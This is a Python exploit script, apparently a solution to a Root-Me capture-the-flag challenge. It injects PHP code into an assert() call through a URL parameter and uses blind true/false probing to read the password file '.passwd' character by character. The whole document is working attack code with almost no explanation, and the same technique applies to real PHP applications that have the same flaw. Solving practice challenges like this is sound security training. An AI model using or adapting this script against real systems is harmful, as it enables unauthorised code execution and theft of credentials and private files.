import base64
import string
import requests
import urllib.parse  # Use urllib.parse for urlencode in Python 3

# Set the target URL of the vulnerable web application
url = "http://challenge01.root-me.org/web-serveur/ch47/"

# Base payload template for injecting into the assert() statement
base = "/', 'qwer') === false && %s && strpos('1" 

def check(payload):
    """
    Sends a request to the target URL with the given payload and checks the response.
    """
    params = urllib.parse.urlencode({'page': payload})
    try:
        r = requests.get(url, params=params)
    except requests.exceptions.ConnectionError:
        r = requests.get(url, params=params)
    return "Warning" not in r.text


def get_len(path):
    """
    Determines the length of the target file using a binary search-like approach.
    """
    i = 10
    while True:
        payload = 'strlen(file_get_contents("%s")) < %d' % (path, i)
        if check(base % payload):
            for j in range(i - 10, i):
                payload = 'strlen(file_get_contents("%s")) == %d' % (path, j)
                if check(base % payload):
                    print("Found Length = %d" % j) # Use print() as a function in Python 3
                    return j
        i += 10


def read_file_contents(path):
    """
    Reads the contents of the target file character by character using blind LFI.
    """
    length = get_len(path)
    s = ""

    while len(s) < length:
        for c in string.printable:
            tmp = s + c
            # Use f-strings for string formatting in Python 3
            payload = f'substr(file_get_contents("{path}"), 0, {len(tmp)}) == base64_decode("{base64.b64encode(tmp.encode()).decode()}")'

            if check(base % payload):
                s += c
                print(s) # Use print() as a function in Python 3
    print(s) # Use print() as a function in Python 3

# Start the exploit 
print(read_file_contents('.passwd')) 
